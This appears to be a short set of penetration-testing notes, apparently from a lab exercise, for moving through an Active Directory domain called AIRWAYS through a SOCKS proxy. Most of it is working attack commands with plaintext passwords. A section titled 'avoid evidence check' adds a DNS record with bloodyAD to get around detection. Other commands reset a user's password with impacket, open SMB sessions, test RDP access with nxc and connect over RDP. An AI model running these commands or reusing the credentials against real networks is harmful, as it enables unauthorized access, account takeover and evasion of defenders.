# Recon
```
# find internels , Notice this seem missing some machine
ip neigh

# check self 
ip -br addr
```

# Avoid evidence check 
1. SSL cert error 
// for arch linux ssl path: /etc/ca-certificates/trust-source/anchors/
trust achor your_cert.pem
trust extract-compat
update-ca-trust

2. add dns record for avoid internal ip check
proxychains4 bloodyAD -H 192.168.100.1 -d AIRWAYS -u gabby.t -p 'behKRZudaZ0!' add dnsRecord zztest 10.10.17.159

# Basic 
// change password
proxychains4 changepasswd.py 'AIRWAYS/Isabel.O:ChangeTempP4ss123!@192.168.100.1' -newpass "zzChangeTempP4ss123!"

// smbclient
proxychains4 smbclient.py 'AIRWAYS/Isabel.O:zzChangeTempP4ss123!@192.168.100.1'

// check rdp pwn3d
proxychains4 nxc rdp 192.168.100.1 -u Isabel.O -p 'zzChangeTempP4ss123!' -d AIRWAYS

// rdp with proxy
xfreerdp3 /proxy:socks5://127.0.0.1:1080 /v:192.168.100.1:3389 /u:Isabel.O /d:AIRWAYS


# Others
// for go net/http cert path
export SSL_CERT_DIR=~/Downloads/